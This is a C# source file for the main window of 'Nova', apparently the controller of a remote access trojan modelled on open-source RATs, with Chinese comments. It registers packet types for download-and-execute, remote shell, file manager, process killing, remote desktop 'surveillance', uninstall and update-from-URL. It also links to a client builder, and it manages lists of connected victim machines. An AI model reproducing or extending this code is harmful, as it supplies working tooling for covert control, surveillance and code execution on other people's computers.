using System;
using System.Threading;
using System.Windows.Forms;
using Nova.Commands;
using Nova.Packets;
using Nova.Packets.ClientPackets;
using Nova.Packets.ServerPackets;
using Nova.Settings;
namespace Nova.Forms
{
    public partial class frmMain : Form
    {
        public Server listenServer;
        private readonly ListViewColumnSorter lvwColumnSorter;
        public frmMain()
        {
            XMLSettings.WriteDefaultSettings();

            XMLSettings.ListenPort = ushort.Parse(XMLSettings.ReadValue("ListenPort"));
            XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
            XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
            XMLSettings.Password = XMLSettings.ReadValue("Password");

            if (bool.Parse(XMLSettings.ReadValue("ShowToU")))
            {
                using (var frm = new frmTermsOfUse())
                {
                    frm.ShowDialog();
                }
                Thread.Sleep(300);
            }
            InitializeComponent();

            this.Menu = mainMenu;
            lvwColumnSorter = new ListViewColumnSorter();
            lstClients.ListViewItemSorter = lvwColumnSorter;
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            listenServer = new Server(8192);
            listenServer.AddTypesToSerializer(typeof(IPacket), new Type[]
            {
                typeof(InitializeCommand),
                typeof(Disconnect),
                typeof(Reconnect),
                typeof(Uninstall),
                typeof(DownloadAndExecute),
                typeof(Desktop),
                typeof(GetProcesses),
                typeof(KillProcess),
                typeof(StartProcess),
                typeof(Drives),
                typeof(Folder),
                typeof(DownloadFile),
                typeof(MouseClick),
                typeof(GetSystemInfo),
                typeof(Update),
                typeof(Monitors),
                typeof(ShellCommand),
                typeof(Rename),
                typeof(Delete),
                typeof(PowerOptions),
                typeof(Initialize),
                typeof(Status),
                typeof(UserStatus),
                typeof(DesktopResponse),
                typeof(GetProcessesResponse),
                typeof(DrivesResponse),
                typeof(DirectoryResponse),
                typeof(DownloadFileResponse),
                typeof(GetSystemInfoResponse),
                typeof(MonitorsResponse),
                typeof(ShellCommandResponse),

                typeof(UnknownPacket),
                typeof(KeepAlive),
                typeof(KeepAliveResponse)
        });

            listenServer.ServerState += ServerState;
            listenServer.ClientState += ClientState;
            listenServer.ClientRead += clientRead;

            if (XMLSettings.AutoListen)
                listenServer.Listen(XMLSettings.ListenPort);
        }
        private void ServerState(Server server, bool listening)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    botListen.Text = "Listening: " + listening.ToString();
                });
            }
            catch
            { }
        }
        //界面反馈
        private void ClientState(Server server, Client client, bool connected)
        {
            if (connected)
            {
                // 初始化用户状态 以至于我们能存储 values值 在我们需要的时候.
                client.Value = new UserState();

                client.Send(new InitializeCommand());
            }
            //列表去掉
            else
            {
                this.Invoke((MethodInvoker)delegate
                {
                    foreach (ListViewItem lvi in lstClients.Items)
                        if ((Client)lvi.Tag == client)
                        {
                            lvi.Remove();
                            server.ConnectedClients--;
                        }
                });
                updateWindowTitle(listenServer.ConnectedClients, lstClients.SelectedItems.Count);
            }
        }
        public void updateWindowTitle(int count, int selected)
        {
            //显示而已不需要放在UI线程
            if (selected > 0)
                this.Text = string.Format("Nova - 连接数: {0} [选择数: {1}] - 线程数: {2}", count, selected, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
            else
                this.Text = string.Format("Nova - 连接数: {0} - 线程数: {1}", count, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
        }
        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (listenServer.Listening)
                listenServer.Disconnect();
            nIcon.Visible = false;
        }

        private void clientRead(Server server, Client client, IPacket packet)
        {
            Type type = packet.GetType();
            //高频不要打印
            //Console.WriteLine("packet.GetType() == " + packet.GetType().ToString());
            if (!client.Value.isAuthenticated)
            {
                if (type == typeof(Initialize))
                    CHandler.HandleInitialize(client, (Initialize)packet, this);
                else
                    return;
            }
            if (type == typeof(Status))
            {
                CHandler.HandleStatus(client, (Status)packet, this);
            }
            else if (type == typeof(UserStatus))
            {
                CHandler.HandleUserStatus(client, (UserStatus)packet, this);
            }
            else if (type == typeof(GetSystemInfoResponse))
            {
                CHandler.HandleGetSystemInfoResponse(client, (GetSystemInfoResponse)packet);
            }
            else if (type == typeof(ShellCommandResponse))
            {
                CHandler.HandleShellCommandResponse(client, (ShellCommandResponse)packet);
            }
            else if (type == typeof(DrivesResponse))
            {
                CHandler.HandleDrivesResponse(client, (DrivesResponse)packet);
            }
            else if (type == typeof(DirectoryResponse))
            {
                CHandler.HandleDirectoryResponse(client, (DirectoryResponse)packet);
            }
            else if (type == typeof(DownloadFileResponse))
            {
                CHandler.HandleDownloadFileResponse(client, (DownloadFileResponse)packet);
            }
            else if (type == typeof(GetProcessesResponse))
            {
                CHandler.HandleGetProcessesResponse(client, (GetProcessesResponse)packet);
            }
            else if (type == typeof(MonitorsResponse))
            {
                CHandler.HandleMonitorsResponse(client, (MonitorsResponse)packet);
            }
            else if (type == typeof(DesktopResponse))
            {
                CHandler.HandleRemoteDesktopResponse(client, (DesktopResponse)packet);
            }
        }
        #region "ContextMenu"
        private void ctxtUpdate_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                frmUpdate frmU = new frmUpdate(lstClients.SelectedItems.Count);
                if (frmU.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    foreach (ListViewItem lvi in lstClients.SelectedItems)
                    {
                        Client c = (Client)lvi.Tag;
                        c.Send(new Nova.Packets.ServerPackets.Update(_Update.DownloadURL));
                    }
                }
            }
        }
        private void ctxtDisconnect_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                Client c = (Client)lvi.Tag;
                c.Send(new Nova.Packets.ServerPackets.Disconnect());
            }
        }

        private void ctxtReconnect_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                Client c = (Client)lvi.Tag;
                c.Send(new Nova.Packets.ServerPackets.Reconnect());
            }
        }
        private void ctxtUninstall_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show(string.Format("确定卸载 {0} 这些客户端?\n客户端不会再回来的", lstClients.SelectedItems.Count), "卸载确认", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client)lvi.Tag;
                    c.Send(new Nova.Packets.ServerPackets.Uninstall());
                }
            }
        }
        #endregion

        #region "System"
        private void ctxtSystemInformation_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client)lstClients.SelectedItems[0].Tag;
                if (c.Value.frmSI != null)
                {
                    c.Value.frmSI.Focus();
                    return;
                }
                frmSystemInformation frmSI = new frmSystemInformation(c);
                frmSI.Show();
            }
        }
        private void ctxtRemoteShell_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client)lstClients.SelectedItems[0].Tag;
                if (c.Value.frmRS != null)
                {
                    c.Value.frmRS.Focus();
                    return;
                }
                frmRemoteShell frmRS = new frmRemoteShell(c);
                frmRS.Show();
            }
        }
        private void ctxtFileManager_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client)lstClients.SelectedItems[0].Tag;
                if (c.Value.frmFM != null)
                {
                    c.Value.frmFM.Focus();
                    return;
                }
                frmFileManager frmFM = new frmFileManager(c);
                frmFM.Show();
            }
        }
        private void ctxtTaskManager_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client)lstClients.SelectedItems[0].Tag;
                if (c.Value.frmTM != null)
                {
                    c.Value.frmTM.Focus();
                    return;
                }
                frmTaskManager frmTM = new frmTaskManager(c);
                frmTM.Show();
            }
        }
        private void ctxtShutdown_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client)lvi.Tag;
                    c.Send(new Nova.Packets.ServerPackets.PowerOptions(0));
                }
            }
        }
        private void ctxtRestart_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client)lvi.Tag;
                    c.Send(new Nova.Packets.ServerPackets.PowerOptions(1));
                }
            }
        }

        private void ctxtStandby_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client)lvi.Tag;
                    c.Send(new Nova.Packets.ServerPackets.PowerOptions(2));
                }
            }
        }
        #endregion

        #region "Surveillance"
        private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client)lstClients.SelectedItems[0].Tag;
                if (c.Value.frmRDP != null)
                {
                    c.Value.frmRDP.Focus();
                    return;
                }
                frmRemoteDesktop frmRDP = new frmRemoteDesktop(c);
                frmRDP.Show();
            }
        }
        #endregion

        #region "MenuStrip"
        private void menuClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void menuSettings_Click(object sender, EventArgs e)
        {
            using (var frm = new frmSettings(listenServer))
            {
                frm.ShowDialog();
            }
        }

        private void menuBuilder_Click(object sender, EventArgs e)
        {
            using (var frm = new frmBuilder())
            {
                frm.ShowDialog();
            }
        }

        private void menuStatistics_Click(object sender, EventArgs e)
        {
            if (listenServer.BytesReceived == 0 || listenServer.BytesSent == 0)
                MessageBox.Show("请等待至少一个客户端连接!", "Nova", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else
            {
                using (var frm = new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent))
                {
                    frm.ShowDialog();
                }
            }
        }

        private void menuAbout_Click(object sender, EventArgs e)
        {
            using (var frm = new frmAbout())
            {
                frm.ShowDialog();
            }
        }
        #endregion

        private void nIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal) ? FormWindowState.Minimized : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }
        private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }
            // Perform the sort with these new sort options.
            lstClients.Sort();
        }
        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            updateWindowTitle(listenServer.ConnectedClients, lstClients.SelectedItems.Count);
        }
    }
}
